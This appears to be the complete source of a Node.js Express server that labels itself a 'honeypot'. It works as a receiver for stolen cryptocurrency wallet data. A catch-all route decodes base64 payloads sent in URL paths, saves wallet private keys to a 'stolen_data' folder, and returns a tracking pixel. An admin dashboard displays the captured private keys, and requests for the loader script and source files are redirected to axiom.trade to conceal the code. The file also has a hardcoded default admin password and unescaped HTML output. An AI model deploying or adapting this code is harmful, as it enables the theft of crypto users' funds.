const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');
const LOGS_FOLDER = path.join(__dirname, 'logs');

// Admin credentials - CHANGE THESE!
const ADMIN_USERNAME = process.env.ADMIN_USER || 'MrHoneypot';
const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'hancox2005S!';

// Simple session storage (in-memory)
const sessions = new Map();

if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });

app.set('trust proxy', true);
app.use(express.urlencoded({ extended: true }));

// Get real client IP
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) return forwarded.split(',')[0].trim();
    return req.headers['x-real-ip'] || req.ip || req.socket.remoteAddress;
}

function logAccess(req, type, extra = {}) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || 'none',
        url: req.originalUrl,
        ...extra
    };
    fs.appendFileSync(path.join(LOGS_FOLDER, 'access.log'), JSON.stringify(logEntry) + '\n');
    console.log(`[${type}] ${logEntry.ip}`);
}

// Session cookie parser
function getSession(req) {
    const cookie = req.headers.cookie || '';
    const match = cookie.match(/sessionId=([^;]+)/);
    return match ? match[1] : null;
}

function isAuthenticated(req) {
    const sessionId = getSession(req);
    return sessionId && sessions.has(sessionId);
}

function requireAuth(req, res, next) {
    if (isAuthenticated(req)) {
        return next();
    }
    // Redirect to login page
    res.redirect('/admin/login?redirect=' + encodeURIComponent(req.originalUrl));
}

// CSS styles for all pages
const commonStyles = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; margin: 0; }
    h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
    .login-box { max-width: 400px; margin: 100px auto; border: 2px solid #0f0; padding: 40px; background: #111; }
    .login-box h2 { margin-top: 0; text-align: center; }
    input[type="text"], input[type="password"] { 
        width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #0f0; 
        color: #0f0; font-family: monospace; font-size: 14px; box-sizing: border-box;
    }
    input[type="text"]:focus, input[type="password"]:focus { outline: none; border-color: #ff0; }
    button { 
        background: #0f0; color: #000; border: none; padding: 12px 30px; cursor: pointer; 
        font-family: 'Inter', monospace; font-weight: bold; font-size: 14px; width: 100%; margin-top: 10px;
    }
    button:hover { background: #0a0; }
    .error { color: #f00; margin: 10px 0; text-align: center; }
    .logout-btn { 
        float: right; background: #f00; color: #fff; width: auto; padding: 8px 20px;
    }
    .logout-btn:hover { background: #a00; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9em; }
    th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
    th { background: #003300; }
    tr:hover { background: #001100; }
    .ip { color: #ff0; font-weight: bold; }
    .timestamp { color: #888; font-size: 0.85em; }
    .download-btn { 
        background: #00f; color: #fff; padding: 5px 15px; text-decoration: none; 
        display: inline-block; font-size: 0.85em;
    }
    .download-btn:hover { background: #008; }
    .view-btn { 
        background: #0f0; color: #000; padding: 5px 15px; text-decoration: none; 
        display: inline-block; font-size: 0.85em; margin-right: 5px;
    }
    .view-btn:hover { background: #0a0; }
    .stats { display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }
    .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 120px; }
    .stat-box h3 { margin: 0 0 10px 0; color: #ff0; font-size: 0.9em; }
    .stat-box .number { font-size: 2em; color: #0f0; }
    .nav { margin: 20px 0; }
    .nav a { color: #0f0; margin-right: 15px; }
    pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; font-size: 0.8em; }
    .capture-card { border: 1px solid #0f0; padding: 15px; margin: 15px 0; background: #111; }
    .capture-card h3 { margin-top: 0; color: #ff0; }
    .wallet-count { color: #0f0; font-weight: bold; }
    .actions { margin-top: 10px; }
`;

// ============================================
// LOGIN ROUTES
// ============================================

app.get('/admin/login', (req, res) => {
    logAccess(req, 'LOGIN_PAGE');
    
    // If already logged in, redirect to admin
    if (isAuthenticated(req)) {
        return res.redirect('/admin');
    }
    
    const error = req.query.error ? '<div class="error">Invalid username or password</div>' : '';
    const redirect = req.query.redirect || '/admin';
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Login</title>
        <style>${commonStyles}</style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Admin Login</h2>
            ${error}
            <form method="POST" action="/admin/login">
                <input type="hidden" name="redirect" value="${redirect}">
                <input type="text" name="username" placeholder="Username" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

app.post('/admin/login', express.urlencoded({ extended: true }), (req, res) => {
    const { username, password, redirect } = req.body;
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        // Create session
        const sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
        sessions.set(sessionId, { created: Date.now() });
        
        // Set cookie
        res.setHeader('Set-Cookie', `sessionId=${sessionId}; HttpOnly; Path=/; Max-Age=86400`);
        logAccess(req, 'LOGIN_SUCCESS');
        res.redirect(redirect || '/admin');
    } else {
        logAccess(req, 'LOGIN_FAILED', { username });
        res.redirect('/admin/login?error=1');
    }
});

app.get('/admin/logout', (req, res) => {
    const sessionId = getSession(req);
    if (sessionId) sessions.delete(sessionId);
    res.setHeader('Set-Cookie', 'sessionId=; HttpOnly; Path=/; Max-Age=0');
    res.redirect('/admin/login');
});

// ============================================
// PROTECTED ADMIN ROUTES
// ============================================

// Railway health check - MUST return 200 OK
app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.status(200).json({ status: 'ok', msg: 'OK' });
});

// Root path - return simple OK for health checks
app.get('/', (req, res) => {
    logAccess(req, 'ROOT');
    res.status(200).send('OK');
});

// HTML Dashboard
app.get('/admin', requireAuth, (req, res) => {
    logAccess(req, 'ADMIN_DASHBOARD');
    
    try {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files.map(f => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                data.filename = f;
                return data;
            } catch (e) { return null; }
        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Honeypot Dashboard</title>
            <style>${commonStyles}</style>
        </head>
        <body>
            <h1>🍯 Honeypot Dashboard <a href="/admin/logout" class="logout-btn">Logout</a></h1>
            
            <div class="nav">
                <a href="/admin">Dashboard</a>
                <a href="/admin/logs">View All Captures</a>
                <a href="/admin/logs?download=all">Download All</a>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Total Captures</h3>
                    <div class="number">${captures.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Wallets Stolen</h3>
                    <div class="number">${totalWallets}</div>
                </div>
                <div class="stat-box">
                    <h3>Unique Attackers</h3>
                    <div class="number">${uniqueIps.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Server Time</h3>
                    <div class="number" style="font-size: 0.8em;">${new Date().toLocaleTimeString()}</div>
                </div>
            </div>
            
            <h2>Recent Captures (Last 20)</h2>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Attacker IP</th>
                        <th>Code</th>
                        <th>Wallets</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    ${captures.slice(0, 20).map(c => `
                        <tr>
                            <td class="timestamp">${new Date(c.receivedAt).toLocaleString()}</td>
                            <td class="ip">${c.attackerIp || 'Unknown'}</td>
                            <td>${c.code || 'N/A'}</td>
                            <td>${c.walletCount || c.wallets?.length || 0}</td>
                            <td>
                                <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="view-btn">View</a>
                                <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="download-btn">Download</a>
                            </td>
                        </tr>
                    `).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>'}
                </tbody>
            </table>
            
            <h2>Debug: Last 10 Access Logs</h2>
            <pre>${(() => {
                try {
                    const logs = fs.readFileSync(path.join(LOGS_FOLDER, 'access.log'), 'utf8')
                        .split('\n').filter(Boolean).slice(-10)
                        .map(l => JSON.parse(l))
                        .map(l => `[${l.timestamp}] ${l.type} from ${l.ip}`)
                        .join('\n');
                    return logs || 'No logs yet';
                } catch(e) { return 'No logs file'; }
            })()}</pre>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// HTML Logs page with download buttons
app.get('/admin/logs', requireAuth, (req, res) => {
    logAccess(req, 'ADMIN_LOGS');
    
    // Handle download all request
    if (req.query.download === 'all') {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const allData = files.map(f => {
            try {
                return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
            } catch (e) { return null; }
        }).filter(Boolean);
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename="all_captures.json"');
        return res.send(JSON.stringify(allData, null, 2));
    }
    
    try {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files.map(f => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                data.filename = f;
                return data;
            } catch (e) { return null; }
        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>All Captures - Honeypot</title>
            <style>${commonStyles}</style>
        </head>
        <body>
            <h1>📋 All Captures <a href="/admin/logout" class="logout-btn">Logout</a></h1>
            
            <div class="nav">
                <a href="/admin">← Dashboard</a>
                <a href="/admin/logs?download=all" style="color: #ff0;">⬇ Download All JSON</a>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Total Files</h3>
                    <div class="number">${captures.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Total Wallets</h3>
                    <div class="number">${totalWallets}</div>
                </div>
            </div>
            
            <h2>All Captured Data</h2>
            
            ${captures.map(c => `
                <div class="capture-card">
                    <h3>📁 ${c.filename}</h3>
                    <p><span class="timestamp">Time:</span> ${new Date(c.receivedAt).toLocaleString()}</p>
                    <p><span class="ip">IP:</span> ${c.attackerIp || 'Unknown'}</p>
                    <p><span class="wallet-count">Wallets:</span> ${c.wallets?.length || 0}</p>
                    <p>Code: ${c.code || 'N/A'}</p>
                    <div class="actions">
                        <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="view-btn">View Details</a>
                        <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="download-btn">Download JSON</a>
                    </div>
                </div>
            `).join('') || '<p style="color:#888;">No captures yet</p>'}
            
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// Download individual file
app.get('/admin/download', requireAuth, (req, res) => {
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) return res.status(400).send('Invalid filename');
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) return res.status(404).send('File not found');
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.sendFile(filePath);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// View specific file
app.get('/admin/file', requireAuth, (req, res) => {
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) return res.status(400).send('Invalid filename');
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) return res.status(404).send('File not found');
        
        const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Capture: ${filename}</title>
            <style>${commonStyles}</style>
        </head>
        <body>
            <h1>📋 Capture Details <a href="/admin/logout" class="logout-btn">Logout</a></h1>
            
            <div class="nav">
                <a href="/admin">← Dashboard</a>
                <a href="/admin/logs">← All Captures</a>
                <a href="/admin/download?f=${encodeURIComponent(filename)}" style="color: #ff0;">⬇ Download JSON</a>
            </div>
            
            <div class="capture-card">
                <h3>Attacker Information</h3>
                <p><span class="ip">IP:</span> ${data.attackerIp || 'Unknown'}</p>
                <p><span class="timestamp">Time:</span> ${data.receivedAt}</p>
                <p>Code: ${data.code || 'N/A'}</p>
                <p>User Agent: ${data.userAgent || 'Unknown'}</p>
            </div>
            
            <div class="capture-card">
                <h3>Wallets (${data.wallets?.length || 0})</h3>
                ${(data.wallets || []).map((w, i) => `
                    <div style="border: 1px solid #333; padding: 10px; margin: 10px 0; background: #0a0a0a;">
                        <p><strong>#${i+1} Type:</strong> ${w.type || 'unknown'}</p>
                        <p><strong>Public:</strong> <span style="color: #0ff; word-break: break-all;">${w.pub || 'N/A'}</span></p>
                        <p><strong>Private:</strong> <span style="color: #f00; background: #330000; padding: 2px 5px; word-break: break-all;">${w.priv || 'N/A'}</span></p>
                    </div>
                `).join('') || '<p>No wallets</p>'}
            </div>
            
            <div class="capture-card">
                <h3>Raw JSON Data</h3>
                <pre>${JSON.stringify(data, null, 2)}</pre>
            </div>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// Redirect loader.js and any .js files to axiom.trade
app.get('/loader.js', (req, res) => {
    logAccess(req, 'LOADER_REQUEST_BLOCKED');
    res.redirect(302, 'https://axiom.trade');
});

// Block access to all JavaScript files and server code
app.get('*.js', (req, res) => {
    logAccess(req, 'JS_FILE_BLOCKED', { path: req.path });
    res.redirect(302, 'https://axiom.trade');
});

// Block access to package.json and other sensitive files
app.get(['/package.json', '/package-lock.json', '/.env', '/.git/*', '/*.md', '/README*', '/LICENSE*'], (req, res) => {
    logAccess(req, 'SENSITIVE_FILE_BLOCKED', { path: req.path });
    res.redirect(302, 'https://axiom.trade');
});

// ============================================
// CATCH-ALL ROUTE LAST (for stolen data)
// ============================================

app.get('*', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    
    // Skip if it's a file request
    if (req.path.includes('.')) {
        return res.status(404).end();
    }
    
    const encodedData = req.path.substring(1);
    
    console.log(`[DATA] From: ${clientIp} | Path: ${encodedData.substring(0, 50)}...`);
    
    if (encodedData.length < 20) {
        logAccess(req, 'PING', { length: encodedData.length });
        return sendGif(res);
    }
    
    try {
        let decodedData = decodeURIComponent(encodedData);
        
        // Fix base64 padding
        const padding = 4 - (decodedData.length % 4);
        if (padding !== 4) decodedData += '='.repeat(padding);
        
        const jsonStr = Buffer.from(decodedData, 'base64').toString('utf8');
        const data = JSON.parse(jsonStr);
        
        const wallets = data.wallets || [];
        
        const record = {
            receivedAt: timestamp,
            attackerIp: clientIp,
            userAgent: data.header || req.headers['user-agent'],
            code: data.code,
            site: data.site,
            walletCount: wallets.length,
            wallets: wallets,
            rawPayload: data
        };
        
        const filename = `capture_${Date.now()}_${clientIp.replace(/[^0-9a-zA-Z]/g, '_')}.json`;
        fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
        
        console.log(`✅ SAVED: ${filename} | Wallets: ${wallets.length}`);
        logAccess(req, 'CAPTURE', { filename, wallets: wallets.length });
        
    } catch (err) {
        console.error(`❌ Error: ${err.message}`);
        logAccess(req, 'ERROR', { error: err.message });
    }
    
    sendGif(res);
});

function sendGif(res) {
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    res.send(gif);
}

// ============================================
// START SERVER - Bind to 0.0.0.0 explicitly
// ============================================

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🍯 Honeypot running on port ${PORT}`);
    console.log(`Dashboard: http://0.0.0.0:${PORT}/admin`);
    console.log(`Login: http://0.0.0.0:${PORT}/admin/login`);
    console.log(`Health: http://0.0.0.0:${PORT}/health`);
    console.log(`Admin User: ${ADMIN_USERNAME}`);
});

// Handle errors
server.on('error', (err) => {
    console.error('Server error:', err);
});